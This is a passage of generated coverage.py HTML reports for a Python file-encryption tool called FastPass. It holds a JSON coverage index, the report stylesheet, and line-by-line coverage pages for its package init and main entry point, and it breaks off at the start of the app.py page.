0}}},"z_ae6ae744f2ec6f26_pdf_handler_py":{"hash":"8fd814c1bb5a62f89c5a24cdd96607c3","index":{"url":"z_ae6ae744f2ec6f26_pdf_handler_py.html","file":"src\\core\\crypto_handlers\\pdf_handler.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":66,"n_excluded":0,"n_missing":17,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ce21df766c911d41_file_handler_py":{"hash":"13445d9435dde332817eddc65f1c5625","index":{"url":"z_ce21df766c911d41_file_handler_py.html","file":"src\\core\\file_handler.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":251,"n_excluded":0,"n_missing":45,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_9d0a8317fb892e58___init___py":{"hash":"44bbc17fbdf96f75b57bf7dc9b3a3a73","index":{"url":"z_9d0a8317fb892e58___init___py.html","file":"src\\core\\password\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":2,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_9d0a8317fb892e58_password_manager_py":{"hash":"9397bd392f682b82fe4d000661be3f2f","index":{"url":"z_9d0a8317fb892e58_password_manager_py.html","file":"src\\core\\password\\password_manager.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":66,"n_excluded":0,"n_missing":16,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ce21df766c911d41_security_py":{"hash":"37f91521cae9ae955e7169e55ce78cac","index":{"url":"z_ce21df766c911d41_security_py.html","file":"src\\core\\security.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":93,"n_excluded":0,"n_missing":36,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_6156a86a215061be___init___py":{"hash":"eded7715ae0de196f3e2419702b4ed00","index":{"url":"z_6156a86a215061be___init___py.html","file":"src\\utils\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":3,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_6156a86a215061be_config_py":{"hash":"0739dfe6c4b5e97be098b7cbc42bd35b","index":{"url":"z_6156a86a215061be_config_py.html","file":"src\\utils\\config.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":52,"n_excluded":0,"n_missing":14,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_6156a86a215061be_logger_py":{"hash":"c1b3c1bff6fad28b82ca6a80475e6241","index":{"url":"z_6156a86a215061be_logger_py.html","file":"src\\utils\\logger.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":41,"n_excluded":0,"n_missing":11,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}}}}
</file>

<file path="reports/coverage/style_cb_dca529e9.css">
@charset "UTF-8";
/* Licensed under the Apache License: http://www.apache.org/licenses/LICENSE-2.0 */
/* For details: https://github.com/nedbat/coveragepy/blob/master/NOTICE.txt */
/* Don't edit this .css file. Edit the .scss file instead! */
html, body, h1, h2, h3, p, table, td, th { margin: 0; padding: 0; border: 0; font-weight: inherit; font-style: inherit; font-size: 100%; font-family: inherit; vertical-align: baseline; }

body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; font-size: 1em; background: #fff; color: #000; }

@media (prefers-color-scheme: dark) { body { background: #1e1e1e; } }

@media (prefers-color-scheme: dark) { body { color: #eee; } }

html > body { font-size: 16px; }

a:active, a:focus { outline: 2px dashed #007acc; }

p { font-size: .875em; line-height: 1.4em; }

table { border-collapse: collapse; }

td { vertical-align: top; }

table tr.hidden { display: none !important; }

p#no_rows { display: none; font-size: 1.15em; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; }

a.nav { text-decoration: none; color: inherit; }

a.nav:hover { text-decoration: underline; color: inherit; }

.hidden { display: none; }

header { background: #f8f8f8; width: 100%; z-index: 2; border-bottom: 1px solid #ccc; }

@media (prefers-color-scheme: dark) { header { background: black; } }

@media (prefers-color-scheme: dark) { header { border-color: #333; } }

header .content { padding: 1rem 3.5rem; }

header h2 { margin-top: .5em; font-size: 1em; }

header h2 a.button { font-family: inherit; font-size: inherit; border: 1px solid; border-radius: .2em; background: #eee; color: inherit; text-decoration: none; padding: .1em .5em; margin: 1px calc(.1em + 1px); cursor: pointer; border-color: #ccc; }

@media (prefers-color-scheme: dark) { header h2 a.button { background: #333; } }

@media (prefers-color-scheme: dark) { header h2 a.button { border-color: #444; } }

header h2 a.button.current { border: 2px solid; background: #fff; border-color: #999; cursor: default; }

@media (prefers-color-scheme: dark) { header h2 a.button.current { background: #1e1e1e; } }

@media (prefers-color-scheme: dark) { header h2 a.button.current { border-color: #777; } }

header p.text { margin: .5em 0 -.5em; color: #666; font-style: italic; }

@media (prefers-color-scheme: dark) { header p.text { color: #aaa; } }

header.sticky { position: fixed; left: 0; right: 0; height: 2.5em; }

header.sticky .text { display: none; }

header.sticky h1, header.sticky h2 { font-size: 1em; margin-top: 0; display: inline-block; }

header.sticky .content { padding: 0.5rem 3.5rem; }

header.sticky .content p { font-size: 1em; }

header.sticky ~ #source { padding-top: 6.5em; }

main { position: relative; z-index: 1; }

footer { margin: 1rem 3.5rem; }

footer .content { padding: 0; color: #666; font-style: italic; }

@media (prefers-color-scheme: dark) { footer .content { color: #aaa; } }

#index { margin: 1rem 0 0 3.5rem; }

h1 { font-size: 1.25em; display: inline-block; }

#filter_container { float: right; margin: 0 2em 0 0; line-height: 1.66em; }

#filter_container #filter { width: 10em; padding: 0.2em 0.5em; border: 2px solid #ccc; background: #fff; color: #000; }

@media (prefers-color-scheme: dark) { #filter_container #filter { border-color: #444; } }

@media (prefers-color-scheme: dark) { #filter_container #filter { background: #1e1e1e; } }

@media (prefers-color-scheme: dark) { #filter_container #filter { color: #eee; } }

#filter_container #filter:focus { border-color: #007acc; }

#filter_container :disabled ~ label { color: #ccc; }

@media (prefers-color-scheme: dark) { #filter_container :disabled ~ label { color: #444; } }

#filter_container label { font-size: .875em; color: #666; }

@media (prefers-color-scheme: dark) { #filter_container label { color: #aaa; } }

header button { font-family: inherit; font-size: inherit; border: 1px solid; border-radius: .2em; background: #eee; color: inherit; text-decoration: none; padding: .1em .5em; margin: 1px calc(.1em + 1px); cursor: pointer; border-color: #ccc; }

@media (prefers-color-scheme: dark) { header button { background: #333; } }

@media (prefers-color-scheme: dark) { header button { border-color: #444; } }

header button:active, header button:focus { outline: 2px dashed #007acc; }

header button.run { background: #eeffee; }

@media (prefers-color-scheme: dark) { header button.run { background: #373d29; } }

header button.run.show_run { background: #dfd; border: 2px solid #00dd00; margin: 0 .1em; }

@media (prefers-color-scheme: dark) { header button.run.show_run { background: #373d29; } }

header button.mis { background: #ffeeee; }

@media (prefers-color-scheme: dark) { header button.mis { background: #4b1818; } }

header button.mis.show_mis { background: #fdd; border: 2px solid #ff0000; margin: 0 .1em; }

@media (prefers-color-scheme: dark) { header button.mis.show_mis { background: #4b1818; } }

header button.exc { background: #f7f7f7; }

@media (prefers-color-scheme: dark) { header button.exc { background: #333; } }

header button.exc.show_exc { background: #eee; border: 2px solid #808080; margin: 0 .1em; }

@media (prefers-color-scheme: dark) { header button.exc.show_exc { background: #333; } }

header button.par { background: #ffffd5; }

@media (prefers-color-scheme: dark) { header button.par { background: #650; } }

header button.par.show_par { background: #ffa; border: 2px solid #bbbb00; margin: 0 .1em; }

@media (prefers-color-scheme: dark) { header button.par.show_par { background: #650; } }

#help_panel, #source p .annotate.long { display: none; position: absolute; z-index: 999; background: #ffffcc; border: 1px solid #888; border-radius: .2em; color: #333; padding: .25em .5em; }

#source p .annotate.long { white-space: normal; float: right; top: 1.75em; right: 1em; height: auto; }

#help_panel_wrapper { float: right; position: relative; }

#keyboard_icon { margin: 5px; }

#help_panel_state { display: none; }

#help_panel { top: 25px; right: 0; padding: .75em; border: 1px solid #883; color: #333; }

#help_panel .keyhelp p { margin-top: .75em; }

#help_panel .legend { font-style: italic; margin-bottom: 1em; }

.indexfile #help_panel { width: 25em; }

.pyfile #help_panel { width: 18em; }

#help_panel_state:checked ~ #help_panel { display: block; }

kbd { border: 1px solid black; border-color: #888 #333 #333 #888; padding: .1em .35em; font-family: SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-weight: bold; background: #eee; border-radius: 3px; }

#source { padding: 1em 0 1em 3.5rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, monospace; }

#source p { position: relative; white-space: pre; }

#source p * { box-sizing: border-box; }

#source p .n { float: left; text-align: right; width: 3.5rem; box-sizing: border-box; margin-left: -3.5rem; padding-right: 1em; color: #999; user-select: none; }

@media (prefers-color-scheme: dark) { #source p .n { color: #777; } }

#source p .n.highlight { background: #ffdd00; }

#source p .n a { scroll-margin-top: 6em; text-decoration: none; color: #999; }

@media (prefers-color-scheme: dark) { #source p .n a { color: #777; } }

#source p .n a:hover { text-decoration: underline; color: #999; }

@media (prefers-color-scheme: dark) { #source p .n a:hover { color: #777; } }

#source p .t { display: inline-block; width: 100%; box-sizing: border-box; margin-left: -.5em; padding-left: 0.3em; border-left: 0.2em solid #fff; }

@media (prefers-color-scheme: dark) { #source p .t { border-color: #1e1e1e; } }

#source p .t:hover { background: #f2f2f2; }

@media (prefers-color-scheme: dark) { #source p .t:hover { background: #282828; } }

#source p .t:hover ~ .r .annotate.long { display: block; }

#source p .t .com { color: #008000; font-style: italic; line-height: 1px; }

@media (prefers-color-scheme: dark) { #source p .t .com { color: #6a9955; } }

#source p .t .key { font-weight: bold; line-height: 1px; }

#source p .t .str, #source p .t .fst { color: #0451a5; }

@media (prefers-color-scheme: dark) { #source p .t .str, #source p .t .fst { color: #9cdcfe; } }

#source p.mis .t { border-left: 0.2em solid #ff0000; }

#source p.mis.show_mis .t { background: #fdd; }

@media (prefers-color-scheme: dark) { #source p.mis.show_mis .t { background: #4b1818; } }

#source p.mis.show_mis .t:hover { background: #f2d2d2; }

@media (prefers-color-scheme: dark) { #source p.mis.show_mis .t:hover { background: #532323; } }

#source p.mis.mis2 .t { border-left: 0.2em dotted #ff0000; }

#source p.mis.mis2.show_mis .t { background: #ffeeee; }

@media (prefers-color-scheme: dark) { #source p.mis.mis2.show_mis .t { background: #351b1b; } }

#source p.mis.mis2.show_mis .t:hover { background: #f2d2d2; }

@media (prefers-color-scheme: dark) { #source p.mis.mis2.show_mis .t:hover { background: #532323; } }

#source p.run .t { border-left: 0.2em solid #00dd00; }

#source p.run.show_run .t { background: #dfd; }

@media (prefers-color-scheme: dark) { #source p.run.show_run .t { background: #373d29; } }

#source p.run.show_run .t:hover { background: #d2f2d2; }

@media (prefers-color-scheme: dark) { #source p.run.show_run .t:hover { background: #404633; } }

#source p.run.run2 .t { border-left: 0.2em dotted #00dd00; }

#source p.run.run2.show_run .t { background: #eeffee; }

@media (prefers-color-scheme: dark) { #source p.run.run2.show_run .t { background: #2b2e24; } }

#source p.run.run2.show_run .t:hover { background: #d2f2d2; }

@media (prefers-color-scheme: dark) { #source p.run.run2.show_run .t:hover { background: #404633; } }

#source p.exc .t { border-left: 0.2em solid #808080; }

#source p.exc.show_exc .t { background: #eee; }

@media (prefers-color-scheme: dark) { #source p.exc.show_exc .t { background: #333; } }

#source p.exc.show_exc .t:hover { background: #e2e2e2; }

@media (prefers-color-scheme: dark) { #source p.exc.show_exc .t:hover { background: #3c3c3c; } }

#source p.exc.exc2 .t { border-left: 0.2em dotted #808080; }

#source p.exc.exc2.show_exc .t { background: #f7f7f7; }

@media (prefers-color-scheme: dark) { #source p.exc.exc2.show_exc .t { background: #292929; } }

#source p.exc.exc2.show_exc .t:hover { background: #e2e2e2; }

@media (prefers-color-scheme: dark) { #source p.exc.exc2.show_exc .t:hover { background: #3c3c3c; } }

#source p.par .t { border-left: 0.2em solid #bbbb00; }

#source p.par.show_par .t { background: #ffa; }

@media (prefers-color-scheme: dark) { #source p.par.show_par .t { background: #650; } }

#source p.par.show_par .t:hover { background: #f2f2a2; }

@media (prefers-color-scheme: dark) { #source p.par.show_par .t:hover { background: #6d5d0c; } }

#source p.par.par2 .t { border-left: 0.2em dotted #bbbb00; }

#source p.par.par2.show_par .t { background: #ffffd5; }

@media (prefers-color-scheme: dark) { #source p.par.par2.show_par .t { background: #423a0f; } }

#source p.par.par2.show_par .t:hover { background: #f2f2a2; }

@media (prefers-color-scheme: dark) { #source p.par.par2.show_par .t:hover { background: #6d5d0c; } }

#source p .r { position: absolute; top: 0; right: 2.5em; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; }

#source p .annotate { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; color: #666; padding-right: .5em; }

@media (prefers-color-scheme: dark) { #source p .annotate { color: #ddd; } }

#source p .annotate.short:hover ~ .long { display: block; }

#source p .annotate.long { width: 30em; right: 2.5em; }

#source p input { display: none; }

#source p input ~ .r label.ctx { cursor: pointer; border-radius: .25em; }

#source p input ~ .r label.ctx::before { content: "▶ "; }

#source p input ~ .r label.ctx:hover { background: #e8f4ff; color: #666; }

@media (prefers-color-scheme: dark) { #source p input ~ .r label.ctx:hover { background: #0f3a42; } }

@media (prefers-color-scheme: dark) { #source p input ~ .r label.ctx:hover { color: #aaa; } }

#source p input:checked ~ .r label.ctx { background: #d0e8ff; color: #666; border-radius: .75em .75em 0 0; padding: 0 .5em; margin: -.25em 0; }

@media (prefers-color-scheme: dark) { #source p input:checked ~ .r label.ctx { background: #056; } }

@media (prefers-color-scheme: dark) { #source p input:checked ~ .r label.ctx { color: #aaa; } }

#source p input:checked ~ .r label.ctx::before { content: "▼ "; }

#source p input:checked ~ .ctxs { padding: .25em .5em; overflow-y: scroll; max-height: 10.5em; }

#source p label.ctx { color: #999; display: inline-block; padding: 0 .5em; font-size: .8333em; }

@media (prefers-color-scheme: dark) { #source p label.ctx { color: #777; } }

#source p .ctxs { display: block; max-height: 0; overflow-y: hidden; transition: all .2s; padding: 0 .5em; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; white-space: nowrap; background: #d0e8ff; border-radius: .25em; margin-right: 1.75em; text-align: right; }

@media (prefers-color-scheme: dark) { #source p .ctxs { background: #056; } }

#index { font-family: SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 0.875em; }

#index table.index { margin-left: -.5em; }

#index td, #index th { text-align: right; padding: .25em .5em; border-bottom: 1px solid #eee; }

@media (prefers-color-scheme: dark) { #index td, #index th { border-color: #333; } }

#index td.name, #index th.name { text-align: left; width: auto; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; min-width: 15em; }

#index th { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; font-style: italic; color: #333; cursor: pointer; }

@media (prefers-color-scheme: dark) { #index th { color: #ddd; } }

#index th:hover { background: #eee; }

@media (prefers-color-scheme: dark) { #index th:hover { background: #333; } }

#index th .arrows { color: #666; font-size: 85%; font-family: sans-serif; font-style: normal; pointer-events: none; }

#index th[aria-sort="ascending"], #index th[aria-sort="descending"] { white-space: nowrap; background: #eee; padding-left: .5em; }

@media (prefers-color-scheme: dark) { #index th[aria-sort="ascending"], #index th[aria-sort="descending"] { background: #333; } }

#index th[aria-sort="ascending"] .arrows::after { content: " ▲"; }

#index th[aria-sort="descending"] .arrows::after { content: " ▼"; }

#index td.name { font-size: 1.15em; }

#index td.name a { text-decoration: none; color: inherit; }

#index td.name .no-noun { font-style: italic; }

#index tr.total td, #index tr.total_dynamic td { font-weight: bold; border-top: 1px solid #ccc; border-bottom: none; }

#index tr.region:hover { background: #eee; }

@media (prefers-color-scheme: dark) { #index tr.region:hover { background: #333; } }

#index tr.region:hover td.name { text-decoration: underline; color: inherit; }

#scroll_marker { position: fixed; z-index: 3; right: 0; top: 0; width: 16px; height: 100%; background: #fff; border-left: 1px solid #eee; will-change: transform; }

@media (prefers-color-scheme: dark) { #scroll_marker { background: #1e1e1e; } }

@media (prefers-color-scheme: dark) { #scroll_marker { border-color: #333; } }

#scroll_marker .marker { background: #ccc; position: absolute; min-height: 3px; width: 100%; }

@media (prefers-color-scheme: dark) { #scroll_marker .marker { background: #444; } }
</file>

<file path="reports/coverage/z_145eef247bfb46b6___init___py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\__init__.py: 100%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\__init__.py</b>:
            <span class="pc_cov">100%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">0 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">0<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">0<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="index.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_145eef247bfb46b6___main___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="index.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_145eef247bfb46b6___main___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_145eef247bfb46b6___main___py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\__main__.py: 100%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\__main__.py</b>:
            <span class="pc_cov">100%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">11 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">11<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">0<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_145eef247bfb46b6___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_145eef247bfb46b6_app_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="com">#!/usr/bin/env python3</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">FastPass - Universal File Encryption/Decryption Tool</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t"><span class="str">Makes package executable with 'python -m src'</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="str">Entry point: MAIN PROGRAM ENTRY POINT</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">import</span> <span class="nam">sys</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">import</span> <span class="nam">os</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t"><span class="com"># Add src directory to path for imports</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t"><span class="nam">src_path</span> <span class="op">=</span> <span class="nam">Path</span><span class="op">(</span><span class="nam">__file__</span><span class="op">)</span><span class="op">.</span><span class="nam">parent</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t"><span class="key">if</span> <span class="nam">str</span><span class="op">(</span><span class="nam">src_path</span><span class="op">)</span> <span class="key">not</span> <span class="key">in</span> <span class="nam">sys</span><span class="op">.</span><span class="nam">path</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">    <span class="nam">sys</span><span class="op">.</span><span class="nam">path</span><span class="op">.</span><span class="nam">insert</span><span class="op">(</span><span class="num">0</span><span class="op">,</span> <span class="nam">str</span><span class="op">(</span><span class="nam">src_path</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t"><span class="key">def</span> <span class="nam">main</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t">    <span class="str">"""FastPass main entry point with complete error handling"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t">    <span class="key">from</span> <span class="nam">cli</span> <span class="key">import</span> <span class="nam">main</span> <span class="key">as</span> <span class="nam">cli_main</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t">    <span class="key">return</span> <span class="nam">cli_main</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t"><span class="key">if</span> <span class="nam">__name__</span> <span class="op">==</span> <span class="str">"__main__"</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">    <span class="com"># Program Startup - FastPass application begins execution</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">    <span class="nam">sys</span><span class="op">.</span><span class="nam">exit</span><span class="op">(</span><span class="nam">main</span><span class="op">(</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_145eef247bfb46b6___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_145eef247bfb46b6_app_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_145eef247bfb46b6_app_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\app.py: 81%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\app.py</b>:
            <span class="pc_cov">81%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
